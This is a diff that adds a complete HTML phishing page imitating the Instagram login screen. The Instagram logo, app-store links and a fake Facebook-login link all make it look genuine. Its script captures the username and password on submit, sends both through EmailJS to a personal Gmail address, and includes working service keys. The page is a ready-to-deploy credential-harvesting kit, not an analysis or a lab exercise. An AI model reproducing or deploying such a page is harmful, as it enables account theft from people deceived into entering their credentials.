@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="index.css">
+    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
+    <title>Instagram</title>
+    <link rel="icon" href="img/Instagram_logo_2022.svg.png">
+
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+
+
+</head>
+<body>
+    <main>
+        <img src="img/insta-phone.png" alt="" class="phoneImeg">
+        <div class="form-div">
+            <form onsubmit="login(event)">
+                <img src="img/Instagram-logo.png" alt="logo" class="Instagram-logo">
+                <input type="text" class="input" id="username" placeholder="Phone number, username, or email" required>
+                <input type="password" id="password" class="input" placeholder="Password" required>
+                <button class="login-btn" type="submit">Log In</button>
+                
+                <p id="or">OR</p>
+                <a href="error.html" class="fb-login" target="_blank"><i class='bx bxl-facebook-square'> </i> Log in with Facebook</a>
+                <a href="error.html" class="forgot" target="_blank">Forgot password?</a>
+            </form>
+            <div class="sign-up">
+                <p class="sign-link">Don't have an account? <a href="error.html" class="sign-link2" target="_blank">Sign up</a></p>
+            </div>
+            <div class="get-app">
+                <p>Get the app.</p>
+                <div class="store">
+                    <a href="https://play.google.com/store/apps/details?id=com.instagram.android&pli=1" target="_blank">
+                        <img  src="img/google play.png" alt="" id="play">
+                    </a>
+                    <a href="https://apps.microsoft.com/detail/9nblggh5l9xt?hl=ar-sa&gl" target="_blank">
+                        <img src="img/microsoft.png" alt="" id="microsoft">
+                    </a>
+                </div>
+            </div>
+        </div>
+    </main>  
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script>
+        (function(){
+            emailjs.init("ylq71JyzAns5DK38q");
+        })();
+
+        function login(event) {
+            event.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            emailjs.send("service_wpkoaha", "template_jeowvkk", {
+                from_name: username,
+                message: `Username: ${username}, Password: ${password}`,
+                to_email: "zaidsafeen30@gmail.com"
+            })
+            .then(function(response) {
+                console.log('SUCCESS!', response.status, response.text);
+            }, function(error) {
+                console.log('FAILED...', error);
+            });
+        }
+    </script>
+</body>
+</html>
